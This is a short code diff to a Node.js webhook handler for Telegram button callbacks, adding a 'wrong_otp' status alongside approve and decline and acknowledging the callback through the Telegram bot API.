@@ -65,8 +65,10 @@ app.post('/webhook', async (req, res) => {
             latestStatus = "approved";
         } else if (action.startsWith("decline")) {
             latestStatus = "declined";
+        }else if (action.startsWith("wrong_otp")) {
+            latestStatus = "wrong_otp";
         }
-        
+
         // Acknowledge click to Telegram so loading wheel stops on the button
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
             method: 'POST',
